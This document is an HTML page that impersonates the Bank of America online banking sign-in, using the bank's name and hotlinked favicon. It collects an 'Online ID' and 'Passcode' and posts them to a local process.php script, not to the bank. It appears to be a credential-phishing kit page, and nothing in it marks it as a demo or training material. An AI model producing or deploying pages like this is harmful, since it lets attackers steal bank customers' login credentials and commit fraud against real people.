<!DOCTYPE html>
<html>
<head>
    <title>Bank of America | Sign In</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f5f5f5;
            margin: 0;
        }
        .container {
            width: 400px;
            margin: 100px auto;
            background: #fff;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        .header {
            text-align: center;
            margin-bottom: 20px;
        }
        .header img {
            width: 200px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: #333;
        }
        .form-group input[type="text"], .form-group input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        .form-group button {
            width: 100%;
            padding: 10px;
            background-color: #002664;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        .form-group button:hover {
            background-color: #001e4d;
        }
        .footer {
            text-align: center;
            font-size: 12px;
            color: #666;
            margin-top: 20px;
        }
        .footer a {
            color: #002664;
            text-decoration: none;
        }
        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://www.bankofamerica.com/content/images/bofa_favicon.ico" alt="Bank of America Logo">
            <h2>Sign in to Online Banking</h2>
        </div>
        <form action="process.php" method="POST">
            <div class="form-group">
                <label for="onlineId">Online ID</label>
                <input type="text" id="onlineId" name="onlineId" placeholder="Enter your Online ID" required>
            </div>
            <div class="form-group">
                <label for="passcode">Passcode</label>
                <input type="password" id="passcode" name="passcode" placeholder="Enter your Passcode" required>
            </div>
            <div class="form-group">
                <button type="submit">Sign In</button>
            </div>
        </form>
        <div class="footer">
            <p>Not enrolled? <a href="#">Sign up now</a></p>
            <p>Forgot ID or Passcode? <a href="#">Get help</a></p>
        </div>
    </div>
</body>
</html>
